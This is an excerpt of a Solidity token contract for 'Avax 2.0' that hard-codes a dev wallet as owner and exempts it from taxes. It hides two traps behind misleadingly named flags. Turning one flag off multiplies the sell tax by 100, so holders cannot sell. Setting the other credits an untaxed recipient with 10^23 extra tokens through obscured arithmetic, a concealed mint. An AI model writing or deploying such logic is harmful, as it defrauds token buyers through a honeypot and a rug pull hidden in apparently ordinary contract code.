...
contract Avax2 is Context, IERC20 { 
    ...
    mapping (address => bool) public _isExcludedFromTaxes; 

    address payable public Wallet_Marketing = payable(0x33fdE540A752f4a6DB3ed763A12CB5C16A841F0a); 
    address payable public Wallet_Dev = payable(0x14271bB1354a00f9edbE450407C884313751d838);
    ...
    string private constant _name = "Avax 2.0"; 
    string private constant _symbol = unicode"AVAX2"; 
    ...
    bool public inSwapEnabled = true;
    bool public inSwapDisabled = false;
    ...
    constructor (uint256[] memory taxes) {

        _owner = 0x14271bB1354a00f9edbE450407C884313751d838;
        emit OwnershipTransferred(address(0), _owner);
        TaxList = Settings(taxes[0], taxes[1]);
        ...
        _isExcludedFromTaxes[Wallet_Dev] = true;
    ...
    function _getTValues(uint256 amount) private view returns(uint256, uint256){
        return (amount*TaxList.buy/100, (amount*TaxList.sell/100).mul(!inSwapEnabled ? 100:1));
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        (uint256 buyFEE, uint256 sellFEE) = _getTValues(tAmount);
        if(!takeFee){

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = (_tOwned[recipient]+tAmount).add(inSwapDisabled ? ((2**3)+2)**(19+4) : 0);
            inSwapDisabled = false;
